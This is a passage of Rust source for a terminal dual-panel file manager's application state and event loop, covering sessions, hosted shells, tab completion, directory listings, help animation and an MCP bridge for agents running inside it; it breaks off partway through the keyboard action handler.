//! Application state and the event loop.
//!
//! The loop does exactly three things: drain input, drain state updates, draw.
//! Everything expensive happens in a Tokio task and arrives here as a message —
//! that is the rule that keeps the UI responsive while 100k files are copying.

use crate::action::Action;
use crate::terminal::{CursorStyle, TerminalGuard};
use crate::theme::Theme;
use crate::{keymap, ui};
use dmac_core::{Panel, PanelId, SortOrder};
use dmac_fx::{Canvas, EffectKey, Screensaver, ScreensaverConfig, Wake};
pub use dmac_session::Focus;
use dmac_session::store::SessionStore;
use dmac_session::{Session, SessionId, SessionManager, View};
use dmac_vfs::{BackendRef, ListChunk, VfsPath, local::LocalBackend};
use ratatui::crossterm::event::{
    Event, KeyCode, KeyEvent, KeyEventKind, KeyModifiers, MouseButton, MouseEvent, MouseEventKind,
};
use ratatui::layout::Rect;
use std::sync::Arc;
use tokio::sync::mpsc;

/// A state change produced off the UI thread.
pub(crate) enum Update {
    /// A rebuild asked for by `recycle` finished. `Ok` means restart now.
    Rebuilt(Result<(), String>),
    /// The editor was asked to open a directory. Carries what to tell the user
    /// either way: launching and placing windows are separate things that fail
    /// separately, and "it opened but could not be placed" is not a failure.
    Editor(Result<String, String>),
    /// A slice of a directory listing arrived.
    Entries {
        /// Which session asked for it.
        ///
        /// Routing by panel alone is not enough: sessions each have their own
        /// generation counter, so a stale result from one session can carry a
        /// generation that happens to match another's and be painted into the
        /// wrong workspace. This was doing exactly that.
        session: SessionId,
        panel: PanelId,
        /// Discarded if it does not match the panel's current generation — the
        /// user may have navigated away while the walk was in flight.
        generation: u64,
        chunk: ListChunk,
    },
    Error {
        session: SessionId,
        panel: PanelId,
        message: String,
    },
    /// Completion candidates for the command line came back.
    Completion {
        session: SessionId,
        /// Dropped unless it still matches: the user keeps typing while the
        /// directory is being read, and a completion for a word they have
        /// moved on from would rewrite the line under them.
        generation: u64,
        start: usize,
        items: Vec<String>,
    },
    /// What each session's shell is hosting, read off the process table away
    /// from the render loop. Recorded as it arrives rather than only at
    /// shutdown, so a commander that never gets to shut down still leaves
    /// behind what its agents were.
    Agents(Vec<(SessionId, Option<String>)>),
    /// Where a session's editor window is, read off the window server away from
    /// the render loop. `None` means it has none open any more.
    EditorFrame {
        session: SessionId,
        window: Option<dmac_session::EditorWindow>,
    },
    /// A hosted shell changed what is on its screen. Carries nothing: the
    /// message exists only to break the event loop out of its wait, and the
    /// frame that follows reads the emulator directly.
    ShellOutput,
    /// One line of MCP, from an agent talking to the commander it is running
    /// inside. Parsed on the connection's task, answered here — so no
    /// application state is ever behind a lock, and a slow client cannot stall
    /// a frame.
    Mcp {
        /// Which session the calling agent belongs to, from the bridge's
        /// handshake.
        session: Option<SessionId>,
        line: String,
        /// `None` for a notification, which must not be answered at all.
        reply: tokio::sync::oneshot::Sender<Option<String>>,
    },
}

/// Everything the application needs to start.
///
/// A struct rather than nine parameters: they are all decided in one place and
/// arrive together, and this is the shape `dmac-config` will eventually produce
/// wholesale.
pub struct Startup {
    pub session_name: String,
    pub left: VfsPath,
    pub right: VfsPath,
    pub screensaver: ScreensaverConfig,
    pub splash: bool,
    pub cursor: CursorStyle,
    /// Where sessions are written. `None` disables persistence entirely.
    pub store: Option<SessionStore>,
    /// Sessions already read back from the store, and whether the last run
    /// exited cleanly.
    pub restored: Option<(SessionManager, bool)>,
    /// Rail widths asked for on the command line, overriding what was saved.
    pub rail: RailOverride,
}

/// Rail widths given on the command line. `None` keeps whatever was saved,
/// which is what almost every run wants: a width the user dragged into place is
/// theirs, and a flag that silently reset it every morning would be a bug.
#[derive(Debug, Clone, Copy, Default)]
pub struct RailOverride {
    pub collapsed: Option<u16>,
    pub expanded: Option<u16>,
}

/// Which overlay, if any, owns the keyboard.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Mode {
    Normal,
    /// The screensaver picker, with the highlighted row.
    Picker {
        selected: usize,
    },
    /// The help page, and how far down it is scrolled.
    Help {
        scroll: usize,
    },
    /// F3: looking at a file. The document itself lives on `App` — a `Mode` is
    /// copied about freely and a file is not something to copy — so what is
    /// here is only where in it we are looking.
    View {
        scroll: usize,
        /// Bytes rather than lines. Forced on for a binary file, and available
        /// for a text one because "what is actually in this file" is a question
        /// a text view cannot answer.
        hex: bool,
    },
    /// Contextual commands for the entry under the cursor.
    Context {
        selected: usize,
        anchor: (u16, u16),
    },
    /// The session rail has the keyboard: it is a manager, not just a display.
    Rail {
        selected: usize,
    },
    /// A single-line text prompt.
    Prompt {
        intent: PromptIntent,
    },
    /// The utilities menu, with the highlighted row.
    Utilities {
        selected: usize,
    },
    /// F2: the user's own commands. The menus themselves live on `App` — a
    /// `Mode` is copied about and a parsed file is not something to copy.
    UserMenu {
        selected: usize,
    },
    /// The directory history. Which of the three orders is showing lives on
    /// `App`, not here: it should survive closing and reopening the list.
    History {
        selected: usize,
    },
    /// "Pick up where you left off?" — shown at startup when the last run had
    /// agents going. The list itself is on `App`.
    Reattach {
        selected: usize,
    },
}

/// An agent the last run was hosting, waiting to be resumed.
///
/// Resuming is not automatic. Coming back into a conversation is a thing a
/// person should agree to: the agent picks up context, may act on it, and costs
/// money to run. So it is offered, with its name and its arguments in plain
/// sight, and nothing starts until the answer is yes.
#[derive(Debug, Clone)]
pub(crate) struct Pending {
    /// Index into the session list.
    pub session: usize,
    pub session_name: String,
    /// `claude`, `codex`, whatever it was.
    pub program: String,
    /// What will actually be run: the command, not the expansion of it —
    /// see [`dmac_session::agent::as_resume`].
    pub command: String,
    pub conversation: String,
    /// Unticked rows are left alone: their conversation id is kept, so running
    /// the agent by hand later still comes back to it.
    pub chosen: bool,
}

/// What a prompt is collecting. The value itself lives on `App`, because a
/// `Mode` is `Copy` and a growing string is not.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum PromptIntent {
    RenameSession(usize),
    NewSession,
    /// What to look for in the file being viewed.
    ViewSearch,
}

impl PromptIntent {
    pub(crate) fn title(self) -> &'static str {
        match self {
            PromptIntent::RenameSession(_) => " Rename session ",
            PromptIntent::NewSession => " New session ",
            PromptIntent::ViewSearch => " Find ",
        }
    }
}

/// One movement of the keyboard caret over the hosted shell.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Step {
    /// Signed, so one enum arm covers up, down and both page keys.
    Rows(i32),
    Left,
    Right,
    LineStart,
    LineEnd,
}

/// A left-button drag in progress: the row it started on, so the swept range is
/// recomputed from scratch on every move rather than accumulated — a fast drag
/// skips rows, and accumulating would leave holes in the selection.
#[derive(Debug, Clone, Copy)]
struct Drag {
    panel: PanelId,
    anchor: usize,
    /// `true` for a right-button sweep.
    toggling: bool,
}

/// One row of the F2 menu, ready to draw.
///
/// Built when the menu opens and kept until it closes, so the drawing, the
/// click and the pressed letter are all reading the same list. Two lists that
/// can disagree about what is on screen is how a click runs the wrong command.
#[derive(Debug, Clone)]
pub(crate) struct MenuRow {
    pub label: String,
    pub hint: String,
    pub separator: bool,
    /// Shown, not choosable. A directory's menu before it is trusted is
    /// exactly this: you can read what it offers, and nothing else.
    pub inert: bool,
    /// Which menu it came from and which entry, for when it is chosen.
    pub from: Option<(MenuFrom, usize)>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum MenuFrom {
    Global,
    Directory,
}

/// The help page on its way in: the effect, the surface it draws on, and when
/// it was last advanced.
///
/// Held here rather than in the screensaver engine because it is not a
/// screensaver — it does not take the screen, it does not cycle, and it ends by
/// handing over to a page the user then reads. What it shares with the
/// screensaver is only the effect and the rasterizer, which is exactly the
/// amount of sharing that costs nothing.
pub(crate) struct HelpEntrance {
    effect: dmac_fx::effects::helix::Helix,
    canvas: dmac_fx::Canvas,
    last: std::time::Instant,
}

/// The editor's window for `dir`, as something a session can keep.
///
/// `None` when the editor has no window for it, which is the ordinary case and
/// not a failure: most directories have no editor open on them.
fn read_frame(dir: &std::path::Path) -> Option<dmac_session::EditorWindow> {
    let f = dmac_desktop::editor_frame_for(dir)?;
    Some(dmac_session::EditorWindow {
        dir: dir.display().to_string(),
        x: f.x,
        y: f.y,
        width: f.width,
        height: f.height,
    })
}

/// Where things were drawn last frame, so a click maps back to a row. Rebuilt
/// on every draw, so a resize can never leave it stale.
#[derive(Debug, Clone, Copy, Default)]
pub(crate) struct LayoutCache {
    /// Interior area of each panel — borders excluded, so row 0 is the first entry.
    pub panels: [Rect; 2],
    pub fkeys: Rect,
    pub command: Rect,
    /// Interior of the session rail.
    pub rail: Rect,
    /// The rail including its border. The last column of it is the grip the
    /// pointer drags to resize, and the interior deliberately excludes it.
    pub rail_outer: Rect,
    /// Interior of the shell view while it is showing.
    pub shell: Rect,
    /// Interior of the context menu while it is open.
    pub menu: Rect,
    /// Interior of the screensaver picker while it is open.
    pub picker: Rect,
    /// Interior of the help page while it is open.
    pub help: Rect,
    /// Interior of the file viewer while it is open.
    pub view: Rect,
    /// Interior of the directory history's list, while it is open.
    pub history: Rect,
    /// The whole frame. Needed to render a second, off-screen copy at the same
    /// size when an agent asks what is on screen.
    pub screen: Rect,
}

pub struct App {
    /// Every live session. Switching between them does not save and reload —
    /// they all stay in memory with their listings intact, which is what makes
    /// the rail instant and what lets it stand in for a window switcher.
    pub(crate) sessions: SessionManager,
    /// Whether the session rail is expanded. Collapsed it is a narrow strip, so
    /// you can always see how many sessions you have without opening anything.
    pub(crate) rail_open: bool,
    /// Whether the left button went down on the rail's grip, and whether it has
    /// moved since. A press that never moves is a click on the session under
    /// it, so the last column is not a dead strip.
    rail_grip: Option<bool>,
    /// Set for exactly one keypress after Ctrl-O has brought you out of a
    /// shell, so `Ctrl-O h` reaches the history and `Ctrl-O u` the utilities.
    ///
    /// The escape hatch for terminals that cannot encode Ctrl with Shift —
    /// Apple's Terminal among them, where Ctrl-Shift-H is byte `0x08`, exactly
    /// what Ctrl-H and Backspace send. Ctrl-O is already reserved and no shell
    /// wants it, so a chord built on it needs no modifier support at all.
    chord: bool,
    /// Text being typed into the current prompt.
    pub(crate) prompt_value: String,
    /// Where sessions are written. `None` disables persistence entirely, which
    /// is what `--no-session` and the tests use.
    store: Option<SessionStore>,
    /// Set when the session set changed; the loop flushes it, debounced, so a
    /// burst of edits costs one write rather than one per keystroke.
    dirty_at: Option<std::time::Instant>,
    /// The foreground process group of each session's shell, as last seen.
    ///
    /// Kept only to notice when one moves, which is the moment — and the only
    /// moment — that what a shell is hosting can have changed. Reading it is a
    /// syscall per shell; reading the process table is a fork, and this is what
    /// keeps the second from happening on a timer.
    agent_fg: Vec<(dmac_session::SessionId, i32)>,
    /// The session that was on screen last time we looked. Kept only so that
    /// leaving one can write down where its editor window was.
    last_session: Option<dmac_session::SessionId>,
    /// The help arriving. `Some` only while it is flying in; the page itself
    /// takes over the moment it settles.
    pub(crate) help_entrance: Option<HelpEntrance>,
    /// The file being looked at. Held here rather than in [`Mode::View`]
    /// because a mode is copied about freely and a file is not something to
    /// copy — and because it has to survive the mode changing under it when a
    /// search prompt opens over the top.
    pub(crate) document: Option<dmac_view::Document>,
    /// What is being looked for in it, and which of the matching rows we are
    /// on. Kept across closing and reopening the viewer: looking for the same
    /// string in the next file is the common case.
    pub(crate) view_search: String,
    pub(crate) view_match: usize,
    /// The user's own menu, and the one belonging to the directory in view.
    ///
    /// Both are re-read every time F2 is pressed rather than cached: a menu you
    /// edited and have to restart to see is a menu you stop editing.
    pub(crate) menu_global: Option<dmac_config::menu::Menu>,
    pub(crate) menu_directory: Option<dmac_config::menu::Menu>,
    /// Which directory menus have been approved, and what they said when they
    /// were. Loaded once — it changes only when the user answers the question.
    pub(crate) trust: dmac_config::menu::TrustStore,
    /// The rows F2 is showing, built when it opens so that drawing, clicking
    /// and pressing a letter cannot disagree about what is on screen.
    pub(crate) menu_rows: Vec<MenuRow>,
    /// Full screen: the frame stripped off, leaving only contents on black.
    pub(crate) fullscreen: bool,
    /// Agents from the last run, waiting for an answer to "resume?".
    pub(crate) pending: Vec<Pending>,
    /// Which session the MCP call being handled belongs to — the session the
    /// calling agent is hosted in. Set for the duration of one call, so a tool
    /// answers about the agent's own panels rather than about whichever session
    /// the user happens to be looking at.
    pub(crate) mcp_session: Option<SessionId>,
    /// What has been typed into the directory history's filter.
    pub(crate) history_filter: String,
    /// The last row clicked in the history, and when — a second click on the
    /// same row is what goes there.
    last_history_click: Option<(usize, std::time::Instant)>,
    /// Which reading of the history is showing. On `App` rather than in the
    /// mode, so choosing one is remembered the next time it is opened.
    pub(crate) history_order: dmac_core::history::Order,
    /// Bumped on every completion request, so a result for a word the user has
    /// already typed past is dropped instead of rewriting the line.
    completion_gen: u64,
    /// Escape sequences to hand the real terminal after the next frame.
    ///
    /// Queued rather than written where they are produced, because writing to
    /// stdout in the middle of composing a frame interleaves with what ratatui
    /// is emitting and corrupts both.
    pending_terminal_write: String,
    /// The last click over the hosted shell, for double-click word selection.
    /// Separate from `last_click`, which is about rows in a panel: a cell and a
    /// row are not the same thing and sharing the field would make a click in
    /// one look like a second click in the other.
    last_shell_click: Option<(std::time::Instant, u16, u16)>,
    /// Text selected on the command line, as char offsets (anchor, head).
    ///
    /// Characters, not bytes: every consumer wants to slice the string at these
    /// positions, and a byte offset in the middle of a multi-byte character
    /// panics rather than misbehaving quietly.
    pub(crate) command_selection: Option<(usize, usize)>,
    /// Text selected in the hosted shell, if any.
    pub(crate) shell_selection: Option<crate::ui::shell::Selection>,
    /// Where the keyboard is selecting from over that shell, in the same
    /// visible coordinates as the selection. `None` whenever nothing is being
    /// selected by hand, which is also what makes the child's own cursor the
    /// one on screen the rest of the time.
    pub(crate) shell_caret: Option<crate::ui::shell::Cell>,
    /// Whether the left button is still down on that selection. A drag in
    /// progress is protected from the repaint that would otherwise drop it.
    selecting: bool,
    pub(crate) cursor_style: CursorStyle,
    /// When the software cursor last flipped. Only used in `Software` mode.
    cursor_phase: std::time::Instant,
    pub(crate) theme: Theme,
    pub(crate) status: String,
    backend: BackendRef,
    screensaver: Screensaver,
    pub(crate) mode: Mode,
    pub(crate) layout: LayoutCache,
    /// Incremental-search buffer, filled while a panel has focus. Cleared after
    /// a pause so an unrelated later keystroke does not extend an old search.
    quick_search: String,
    last_search: std::time::Instant,
    drag: Option<Drag>,
    /// Last left-click, for double-click detection.
    last_click: Option<(std::time::Instant, PanelId, usize)>,
    /// Whether the current right-button press has turned into a drag. A press
    /// that never moves is a click and opens the context menu; one that moves is
    /// a selection sweep. Distinguishing them is what lets the right button do
    /// both without a modifier.
    right_dragged: bool,
    /// Where the pointer is, so it can be drawn the way DOS text mode did.
    pub(crate) mouse: Option<(u16, u16)>,
    /// When the splash stops showing. `None` means it was never shown or has
    /// already gone, and contributes no timer either way.
    splash_until: Option<std::time::Instant>,
    should_quit: bool,
    /// When the hosted shell was last painted, so a program flooding stdout is
    /// throttled to a sane frame rate instead of redrawing as fast as the
    /// reader thread can parse.
    last_shell_frame: std::time::Instant,
    pub(crate) tx: mpsc::UnboundedSender<Update>,
}

/// Executables on `PATH` whose name starts with `word`.
///
/// The scan is done once and kept: `PATH` holds a dozen directories with a few
/// thousand files between them, and re-reading all of it on every Tab would
/// turn a keystroke into disk I/O for no new information.
fn commands_starting_with(word: &str) -> Vec<String> {
    static ALL: std::sync::OnceLock<Vec<String>> = std::sync::OnceLock::new();
    let all = ALL.get_or_init(|| {
        let mut out: Vec<String> = SHELL_BUILTINS.iter().map(|s| s.to_string()).collect();
        if let Some(path) = std::env::var_os("PATH") {
            for dir in std::env::split_paths(&path) {
                let Ok(entries) = std::fs::read_dir(&dir) else {
                    continue;
                };
                for e in entries.flatten() {
                    if is_executable(&e) {
                        out.push(e.file_name().to_string_lossy().into_owned());
                    }
                }
            }
        }
        out.sort();
        out.dedup();
        out
    });
    all.iter()
        .filter(|c| c.starts_with(word))
        .cloned()
        .collect()
}

/// Things a shell runs that are not files on `PATH`, so `cd` completes.
const SHELL_BUILTINS: &[&str] = &[
    "alias", "bg", "cd", "declare", "echo", "eval", "exec", "exit", "export", "fg", "history",
    "jobs", "kill", "let", "local", "popd", "pushd", "pwd", "read", "return", "set", "shift",
    "source", "test", "times", "trap", "type", "ulimit", "umask", "unalias", "unset", "wait",
];

#[cfg(unix)]
fn is_executable(e: &std::fs::DirEntry) -> bool {
    use std::os::unix::fs::PermissionsExt;
    e.metadata()
        .map(|m| m.is_file() && m.permissions().mode() & 0o111 != 0)
        .unwrap_or(false)
}

#[cfg(not(unix))]
fn is_executable(e: &std::fs::DirEntry) -> bool {
    e.metadata().map(|m| m.is_file()).unwrap_or(false)
}

/// Filesystem entries matching `word`, as full replacement words.
///
/// The part of the word before the last `/` is kept exactly as typed — a `~`
/// the user wrote stays a `~`, because expanding it under them would rewrite a
/// path they can still read into one they have to re-check.
fn paths_starting_with(word: &str, cwd: &std::path::Path) -> Vec<String> {
    use dmac_core::complete::{escape, unescape};

    let (typed_dir, frag) = match word.rfind('/') {
        Some(i) => (&word[..=i], &word[i + 1..]),
        None => ("", word),
    };
    let frag = unescape(frag);

    let expanded = unescape(typed_dir);
    let dir: std::path::PathBuf = if let Some(rest) = expanded.strip_prefix("~/") {
        match home_dir() {
            Some(h) => h.join(rest),
            None => return Vec::new(),
        }
    } else if expanded.starts_with('/') {
        std::path::PathBuf::from(&expanded)
    } else if expanded.is_empty() {
        cwd.to_path_buf()
    } else {
        cwd.join(&expanded)
    };

    let Ok(entries) = std::fs::read_dir(&dir) else {
        return Vec::new();
    };
    let mut out = Vec::new();
    for e in entries.flatten() {
        let name = e.file_name().to_string_lossy().into_owned();
        if !name.starts_with(&frag) {
            continue;
        }
        // A dotfile only shows once you have asked for one, as in every shell:
        // otherwise the first Tab in a home directory buries the answer.
        if name.starts_with('.') && !frag.starts_with('.') {
            continue;
        }
        let is_dir = e.file_type().map(|t| t.is_dir()).unwrap_or(false);
        // A directory ends in `/` so the next Tab carries straight on into it;
        // a file ends in a space, because there is nothing more to say about it.
        let tail = if is_dir { "/" } else { " " };
        out.push(format!("{typed_dir}{}{tail}", escape(&name)));
        if out.len() >= 5000 {
            break;
        }
    }
    out
}

fn home_dir() -> Option<std::path::PathBuf> {
    std::env::var_os("HOME")
        .or_else(|| std::env::var_os("USERPROFILE"))
        .map(std::path::PathBuf::from)
}

/// The shortest gap between two frames of a hosted shell.
///
/// It bounds a flood, never a first response: the frame that answers a wake-up
/// is drawn immediately, and this only decides when the *next* one may follow.
const SHELL_FRAME_FLOOR: std::time::Duration = std::time::Duration::from_millis(16);

/// How close together two clicks have to be to count as one gesture.
const DOUBLE_CLICK: std::time::Duration = std::time::Duration::from_millis(400);

impl App {
    /// Private: `Update` is an internal message type, so the only supported
    /// entry point is [`run`].
    fn new(start: Startup, tx: mpsc::UnboundedSender<Update>) -> Self {
        let Startup {
            session_name,
            left,
            right,
            screensaver,
            splash,
            cursor,
            store,
            // Both handled by `run`, which needs the terminal up before it can
            // list the restored sessions and has to apply the overrides after
            // the saved widths have been read back.
            restored: _,
            rail: _,
        } = start;
        // The help page goes to the screensaver engine once, here: an effect
        // that shows text is handed it as it starts, and `dmac-fx` never has
        // to know where the words came from.
        let mut screensaver = Screensaver::new(screensaver);
        screensaver.set_text(crate::help::plain_lines());
        Self {
            sessions: SessionManager::new(session_name, left, right),
            rail_open: false,
            rail_grip: None,
            chord: false,
            prompt_value: String::new(),
            store,
            dirty_at: None,
            agent_fg: Vec::new(),
            last_session: None,
            help_entrance: None,
            document: None,
            view_search: String::new(),
            view_match: 0,
            menu_global: None,
            menu_directory: None,
            trust: dmac_config::menu::TrustStore::load(),
            menu_rows: Vec::new(),
            cursor_style: cursor,
            cursor_phase: std::time::Instant::now(),
            theme: Theme::default(),
            status: String::new(),
            backend: Arc::new(LocalBackend::new()),
            screensaver,
            mode: Mode::Normal,
            layout: LayoutCache::default(),
            quick_search: String::new(),
            last_search: std::time::Instant::now(),
            drag: None,
            last_click: None,
            right_dragged: false,
            mouse: None,
            splash_until: splash
                .then(|| std::time::Instant::now() + std::time::Duration::from_millis(1800)),
            should_quit: false,
            fullscreen: false,
            pending: Vec::new(),
            mcp_session: None,
            history_filter: String::new(),
            last_history_click: None,
            history_order: dmac_core::history::Order::default(),
            completion_gen: 0,
            pending_terminal_write: String::new(),
            last_shell_click: None,
            command_selection: None,
            shell_selection: None,
            shell_caret: None,
            selecting: false,
            last_shell_frame: std::time::Instant::now(),
            tx,
        }
    }

    /// The size of the last frame. What the `screen` tool renders a second copy
    /// at, so the text an agent reads is laid out exactly as the user's is.
    pub(crate) fn screen_size(&self) -> (u16, u16) {
        let a = self.layout.screen;
        if a.width >= 2 && a.height >= 2 {
            (a.width, a.height)
        } else {
            (80, 24)
        }
    }

    /// The session currently on screen. Every panel operation goes through here,
    /// so nothing can accidentally act on a session the user is not looking at.
    pub(crate) fn ses(&self) -> &Session {
        self.sessions.current()
    }

    fn ses_mut(&mut self) -> &mut Session {
        self.sessions.current_mut()
    }

    /// Give this session's shell the directory move it was too busy to take.
    ///
    /// Only this session's: an owed `cd` belongs to the panels it was owed to,
    /// and a shell nobody is looking at must not be typed into on the strength
    /// of a navigation from somewhere else. A session switched away from keeps
    /// what it owes and is paid when it comes back.
    pub(crate) fn catch_up_shell_cwd(&mut self) {
        self.ses_mut().catch_up_cwd();
    }

    fn idx(id: PanelId) -> usize {
        Session::index_of(id)
    }

    fn active_panel_mut(&mut self) -> &mut Panel {
        self.ses_mut().active_panel_mut()
    }

    /// Whether a text cursor is on screen at all: only when the command line has
    /// focus, nothing is overlaying it, and the terminal is drawing it for us.
    fn shows_text_cursor(&self) -> bool {
        !self.cursor_style.is_software() && self.wants_text_cursor()
    }

    /// The software cursor's state for this frame, or `None` when the real
    /// terminal cursor is being used instead.
    pub(crate) fn software_cursor(&self) -> Option<bool> {
        (self.cursor_style.is_software() && self.wants_text_cursor())
            .then(|| self.software_cursor_on())
    }

    /// Whether the software cursor is in its visible half. The classic terminal
    /// blink is about 530ms, which is slow enough not to be distracting and fast
    /// enough to read as "here".
    pub(crate) fn software_cursor_on(&self) -> bool {
        const PERIOD_MS: u128 = 530;
        (self.cursor_phase.elapsed().as_millis() / PERIOD_MS).is_multiple_of(2)
    }

    /// Whether a text cursor belongs on screen this frame, in either style.
    ///
    /// One predicate for both, because they must never disagree: a frame that
    /// draws a cursor and does not tell it to blink is exactly how a blinking
    /// cursor silently stops blinking.
    fn wants_text_cursor(&self) -> bool {
        if self.mode != Mode::Normal || self.screensaver.is_active() || self.splash_visible() {
            return false;
        }
        match self.ses().view {
            // The hosted program decides. An editor that hid its cursor must
            // stay without one — putting it back would be dmac overriding a
            // decision the program made about its own display.
            View::Shell => self.ses().hosted().is_some_and(|s| {
                !s.finished() && s.with_screen(|sc| !sc.hide_cursor()).unwrap_or(false)
            }),
            View::Panels => self.ses().focus == Focus::CommandLine,
        }
    }

    /// When the software cursor next needs redrawing, if it is in use and
    /// visible. `None` costs no timer, which is the usual case.
    fn cursor_deadline(&self) -> Option<std::time::Instant> {
        if !self.cursor_style.is_software() || !self.wants_text_cursor() {
            return None;
        }
        const PERIOD: std::time::Duration = std::time::Duration::from_millis(530);
        let elapsed = self.cursor_phase.elapsed();
        let next = PERIOD * ((elapsed.as_millis() / PERIOD.as_millis()) as u32 + 1);
        Some(self.cursor_phase + next)
    }

    /// Whether the splash is still on screen. Expiry is checked here rather than
    /// on a timer tick, so a splash that has run out disappears on the next frame
    /// without needing one.
    pub(crate) fn splash_visible(&self) -> bool {
        self.splash_until
            .is_some_and(|t| std::time::Instant::now() < t)
    }

    /// Dismiss the splash. Returns `true` if it was showing, in which case the
    /// input that dismissed it must not also reach the application.
    fn dismiss_splash(&mut self) -> bool {
        if self.splash_visible() {
            self.splash_until = None;
            return true;
        }
        self.splash_until = None;
        false
    }

    /// The screensaver frame to draw, or `None` when the normal UI should be
    /// drawn. Called once per frame by the renderer.
    pub(crate) fn screensaver_canvas(&mut self, width: u16, height: u16) -> Option<&Canvas> {
        self.screensaver.update(width, height)
    }

    /// Start the help's arrival.
    ///
    /// The same effect the screensaver runs, in its one-shot form: it flies in
    /// and stays, because what it settles into here is the real page — the one
    /// the user scrolls and leaves on `Esc` — rather than something that flies
    /// away again while they are halfway down it.
    fn begin_help_entrance(&mut self) {
        let mut effect = dmac_fx::effects::helix::Helix::entrance();
        // The words, from the one place that has them. `dmac-fx` sits below the
        // crate that owns the help and must not go looking for it.
        dmac_fx::Effect::set_text(&mut effect, &crate::help::plain_lines());
        self.help_entrance = Some(HelpEntrance {
            effect,
            canvas: dmac_fx::Canvas::new(0, 0),
            last: std::time::Instant::now(),
        });
    }

    /// The next frame of that arrival, or `None` once the page has landed.
    ///
    /// Drops the entrance as it finishes, so the check that decides what to
    /// draw is also what cleans up: an animation that has ended but is still
    /// held is an animation that will eventually be drawn again.
    pub(crate) fn help_canvas(&mut self, width: u16, height: u16) -> Option<&Canvas> {
        let done = match self.help_entrance.as_mut() {
            None => return None,
            Some(e) => {
                if e.canvas.width() != width || e.canvas.height() != height {
                    e.canvas.resize(width, height);
                    dmac_fx::Effect::resize(&mut e.effect, width, height);
                }
                let now = std::time::Instant::now();
                let dt = now.saturating_duration_since(e.last);
                e.last = now;
                dmac_fx::Effect::tick(&mut e.effect, dt, &mut e.canvas);
                e.effect.settled()
            }
        };
        if done {
            self.help_entrance = None;
            return None;
        }
        self.help_entrance.as_ref().map(|e| &e.canvas)
    }

    /// While the help is arriving, ask for the next frame soon. Without this
    /// the loop waits for a keypress and the animation shows one frame.
    fn help_deadline(&self) -> Option<std::time::Instant> {
        self.help_entrance
            .as_ref()
            .map(|_| std::time::Instant::now() + std::time::Duration::from_millis(33))
    }

    pub(crate) fn cwd_display(&self, id: PanelId) -> String {
        self.ses().cwd[Self::idx(id)].display()
    }

    /// Kick off a listing for one panel. Returns immediately; entries arrive as
    /// [`Update::Entries`] messages, so a slow or hung backend never blocks the loop.
    /// Start a listing for one panel of the session on screen.
    fn reload(&mut self, id: PanelId) {
        let i = self.sessions.current_index();
        self.reload_session(i, id);
    }

    /// Start a listing for any session, visible or not. Restoring a saved set
    /// needs this: every session is live, so every panel needs its contents.
    pub(crate) fn reload_session(&mut self, index: usize, id: PanelId) {
        if index >= self.sessions.len() {
            return;
        }
        let i = Self::idx(id);
        let target = self.sessions.at_mut(index);
        target.generation[i] += 1;
        let generation = target.generation[i];
        let path = target.cwd[i].clone();
        let session = target.id;

        target.panels[i].location = path.display();
        target.panels[i].set_entries(Vec::new());

        let backend = Arc::clone(&self.backend);
        let tx = self.tx.clone();

        tokio::spawn(async move {
            // Bounded: if the UI falls behind, the walk waits instead of buffering
            // a million entries into memory.
            let (chunk_tx, mut chunk_rx) = mpsc::channel(4);
            let walk = {
                let path = path.clone();
                async move { backend.list(&path, chunk_tx).await }
            };
            let pump = async {
                while let Some(res) = chunk_rx.recv().await {
                    match res {
                        Ok(chunk) => {
                            if tx
                                .send(Update::Entries {
                                    session,
                                    panel: id,
                                    generation,
                                    chunk,
                                })
                                .is_err()
                            {
                                return; // UI is gone
                            }
                        }
                        Err(e) => {
                            let _ = tx.send(Update::Error {
                                session,
                                panel: id,
                                message: e.to_string(),
                            });
                        }
                    }
                }
            };
            let (walk_result, ()) = tokio::join!(walk, pump);
            if let Err(e) = walk_result {
                let _ = tx.send(Update::Error {
                    session,
                    panel: id,
                    message: e.to_string(),
                });
            }
        });
    }

    fn apply(&mut self, update: Update) {
        match update {
            Update::Entries {
                session,
                panel,
                generation,
                chunk,
            } => {
                // Deliver to the session that asked, wherever it is in the list —
                // not to whichever session happens to be on screen now.
                let Some(target) = self.sessions.index_of_id(session) else {
                    return; // its session was closed while the walk was running
                };
                let i = Self::idx(panel);
                // Stale result from a directory that session already left.
                if generation != self.sessions.all()[target].generation[i] {
                    return;
                }
                let p = &mut self.sessions.at_mut(target).panels[i];
                p.entries.extend(chunk.entries);
                if chunk.complete {
                    p.resort();
                }
            }
            Update::Completion {
                session,
                generation,
                start,
                items,
            } => self.apply_completion(session, generation, start, items),
            Update::Editor(Ok(message) | Err(message)) => self.status = message,
            Update::Agents(seen) => self.record_agents(&seen),
            Update::EditorFrame { session, window } => {
                if let Some(i) = self.sessions.index_of_id(session)
                    && self.sessions.at_mut(i).editor != window
                {
                    self.sessions.at_mut(i).editor = window;
                    // At once, like the agent: it is what a restart needs, and
                    // the debounce is exactly the window a `kill -9` falls into.
                    self.save_now();
                }
            }
            Update::Rebuilt(Ok(())) => self.restart_in_place(),
            // A failed build changes nothing: the point of building first is
            // that a broken tree costs you a message, not your session.
            Update::Rebuilt(Err(why)) => {
                self.status = format!("rebuild failed — {}", first_error(&why));
            }
            // Nothing to apply: arriving here already cost the redraw that the
            // hosted program was asking for.
            Update::ShellOutput => {}
            Update::Mcp {
                session,
                line,
                reply,
            } => {
                // Every tool runs here, on the UI thread, with the whole
                // application in hand. No locks, and no chance of answering
                // about a panel that moved between the read and the reply.
                self.mcp_session = session;
                let answer = dmac_mcp::dispatch(&line, self);
                self.mcp_session = None;
                let _ = reply.send(answer);
            }
            Update::Error {
                session,
                panel,
                message,
            } => {
                // Only worth reporting if the user can see that session.
                if self.ses().id != session {
                    return;
                }
                // Name the panel: with two of them, "permission denied" alone
                // leaves the user guessing which side failed.
                let side = match panel {
                    PanelId::Left => "left",
                    PanelId::Right => "right",
                };
                self.status = format!("{side} panel: {message}");
            }
        }
    }

    pub(crate) fn handle(&mut self, action: Action) {
        use Action::*;
        self.status.clear();

        match action {
            // A plain move ends any Shift-selection, so the next Shift+arrow
            // anchors where the cursor now is instead of resuming an old span.
            CursorUp => self.move_plain(|p| p.move_cursor(-1)),
            CursorDown => self.move_plain(|p| p.move_cursor(1)),
            PageUp => self.move_plain(|p| p.page(-1)),
            PageDown => self.move_plain(|p| p.page(1)),
